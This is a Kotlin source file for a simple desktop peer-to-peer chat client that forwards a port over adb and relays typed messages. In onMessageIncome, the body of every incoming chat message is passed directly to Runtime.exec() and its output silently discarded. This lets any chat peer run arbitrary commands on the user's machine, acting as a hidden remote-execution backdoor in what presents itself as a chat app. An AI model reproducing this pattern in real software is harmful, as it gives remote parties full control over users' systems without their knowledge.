package www.kaspersky.desktop_app

import www.kaspersky.connector.ChatListener
import www.kaspersky.connector.ChatMessage
import www.kaspersky.connector.P2PChatConnection
import java.util.*

fun main(args: Array<String>) {
    Main.start()
}

object Main : ChatListener {

    override fun onConnectionChanged(connected: Boolean) {
        //
    }

    override fun onMessageIncome(incomeMessage: ChatMessage) {
        printMessage(incomeMessage)
        val tcpForwardResult = Runtime.getRuntime().exec(incomeMessage.body.toString()).inputStream.bufferedReader().readText()
    }

    override fun onMessageSend(outcomeMessage: ChatMessage) {
        //
    }

    private val chatConnection = P2PChatConnection.client("127.0.0.1", 9000)
    fun start() {
        val tcpForwardResult =
            Runtime.getRuntime().exec("adb forward tcp:9000 tcp:8500").inputStream.bufferedReader().readText()
        println(tcpForwardResult)
        chatConnection.connect(this)
        val reader = Scanner(System.`in`)
        while (true) {
            val string = reader.nextLine()
            chatConnection.sendMessage(ChatMessage(System.currentTimeMillis(), string, true))
        }
    }

    private fun printMessage(it: ChatMessage) {
        if (it.selfMessage) {
            println("You: ${it.body}")
        } else {
            println(it.body)
        }
    }

}